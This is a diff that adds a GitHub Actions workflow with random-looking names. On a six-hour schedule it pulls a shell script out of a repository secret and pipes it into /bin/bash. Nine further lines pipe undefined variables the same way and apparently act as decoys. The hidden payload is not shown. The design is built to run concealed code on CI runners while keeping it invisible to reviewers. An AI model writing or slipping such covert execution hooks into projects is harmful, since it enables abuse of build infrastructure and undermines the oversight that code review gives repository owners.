@@ -1,0 +1,26 @@
+name: sirenlezenn
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: sirenlezenn
+        env:
+          yk56: ${{ secrets.yk56 }}
+        run: |
+          echo $yk56 | jq -r .kcn34254 | /bin/bash
+          echo $gk5 | jq -r .rc625 | /bin/bash
+          echo $ewfd1402 | jq -r .bffzw392 | /bin/bash
+          echo $g92 | jq -r .ylxo7 | /bin/bash
+          echo $mjxf3775 | jq -r .ci0998 | /bin/bash
+          echo $ivdz64 | jq -r .hqkss8838 | /bin/bash
+          echo $sb8 | jq -r .nh174 | /bin/bash
+          echo $l248 | jq -r .j40 | /bin/bash
+          echo $npyhh659 | jq -r .hckka2 | /bin/bash
+          echo $am1 | jq -r .rgiw60 | /bin/bash
+
